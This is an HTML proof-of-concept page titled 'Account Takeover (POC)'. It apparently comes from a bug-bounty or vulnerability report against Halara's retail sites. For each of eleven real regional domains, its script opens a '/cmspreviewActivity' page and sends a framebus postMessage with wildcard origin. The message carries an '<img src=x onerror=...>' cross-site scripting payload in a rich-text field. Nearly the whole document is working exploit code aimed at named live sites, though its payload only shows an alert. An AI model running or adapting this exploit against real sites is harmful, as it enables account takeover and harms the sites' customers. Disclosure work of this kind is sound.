<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>ATO - HALARA</title>
    <style>
        body {
            font-family: Inter, system-ui, Segoe UI, Roboto, "Helvetica Neue", Arial;
            background: #f7f9fb;
            color: #111;
            margin: 0;
            padding: 20px;
        }
        .container {
            max-width: 980px;
            margin: 0 auto;
        }
        h1 {
            color: #0b72ff;
        }
        p {
            line-height: 1.6;
        }
        .exploit-btn {
            background: #0b72ff;
            color: white;
            border: none;
            padding: 12px 24px;
            font-size: 16px;
            font-weight: 600;
            border-radius: 6px;
            cursor: pointer;
            margin-top: 20px;
            transition: background 0.2s;
        }
        .exploit-btn:hover {
            background: #0960d9;
        }
        .host-buttons {
            display: flex;
            flex-wrap: wrap;
            gap: 10px;
            margin-top: 20px;
        }
        .host-btn {
            background: #0b72ff;
            color: white;
            border: none;
            padding: 10px 18px;
            font-size: 14px;
            font-weight: 600;
            border-radius: 6px;
            cursor: pointer;
            transition: background 0.2s;
        }
        .host-btn:hover {
            background: #0960d9;
        }
        #status {
            margin-top: 16px;
            font-size: 14px;
            color: #555;
        }
    </style>
</head>
<body>
    <div class="container">
        <h1>Account Takeover (POC)</h1>
        <p>Click any button below to trigger the exploit against that host.</p>
        <div class="host-buttons" id="buttons"></div>
        <p id="status"></p>

        <script>
            const hosts = [
                { label: "halara.com (US)", url: "https://www.halara.com" },
                { label: "thehalara.de (DE)", url: "https://thehalara.de" },
                { label: "thehalara.com.mx (MX)", url: "https://thehalara.com.mx" },
                { label: "thehalara.au (AU)", url: "https://thehalara.au" },
                { label: "thehalara.co.uk (GB)", url: "https://thehalara.co.uk" },
                { label: "thehalara.jp (JP)", url: "https://thehalara.jp" },
                { label: "thehalara.co.kr (KR)", url: "https://thehalara.co.kr" },
                { label: "thehalara.fr (FR)", url: "https://thehalara.fr" },
                { label: "eur.halara.com (EU)", url: "https://eur.halara.com" },
                { label: "ca.halara.com/fr (CA-FR)", url: "https://ca.halara.com/fr" },
                { label: "ca.halara.com/en (CA-EN)", url: "https://ca.halara.com/en" }
            ];

            const container = document.getElementById('buttons');
            hosts.forEach(h => {
                const btn = document.createElement('button');
                btn.className = 'host-btn';
                btn.textContent = h.label;
                btn.onclick = () => triggerExploit(h.url, h.label);
                container.appendChild(btn);
            });

            function triggerExploit(host, label) {
                const status = document.getElementById('status');
                status.textContent = 'Opening ' + label + '...';
                var w = window.open(host + '/cmspreviewActivity');
                setTimeout(function() {
                    var msg = '/*framebus*/' + JSON.stringify({
                        event: 'message',
                        origin: '*',
                        eventData: {
                            dataIndex: 1,
                            contents: [{
                                type: 'richText',
                                h5RichText: '<img src=x onerror=alert(document.domain)>'
                            }]
                        }
                    });
                    w.postMessage(msg, '*');
                    status.textContent = 'Payload sent to ' + label;
                }, 2000);
            }
        </script>
    </div>
</body>
</html>
